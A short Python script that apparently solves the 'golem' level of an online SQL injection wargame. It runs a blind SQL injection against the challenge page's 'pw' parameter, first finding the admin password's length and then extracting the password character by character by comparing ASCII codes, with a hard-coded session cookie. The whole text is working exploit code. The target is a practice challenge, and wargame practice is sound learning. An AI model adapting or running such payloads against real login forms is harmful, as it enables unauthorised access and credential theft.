import requests

url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'PHPSESSID':'f5p0a683aehdana6nepmqcrgbi'}
length = 5
flag=""

while 1:
    params = {'pw': "'||length(pw)<"+str(length)+"-- "}
    response = requests.get(url, headers=headers, cookies=cookies, params=params)
    status_code = response.status_code
    html_data = response.text
    print(response.url)
    if(html_data.find("Hello admin") != -1):
        print "Hello admin"
        length -= 1
        print "length = "+str(length)
        break
    else:
        length+=1

for i in range(1,length+1):
    for j in range(48,123):
        params = {'pw': "'||id like 'admin'&&ascii(mid(pw,"+str(i)+",1)) like "+str(j)+"-- "}
        response = requests.get(url, headers=headers, cookies=cookies, params=params)
        status_code = response.status_code
        html_data = response.text
        print(response.url)
        if (html_data.find("Hello admin") != -1):
            print "Hello admin"
            flag+=chr(j)
            print flag
            break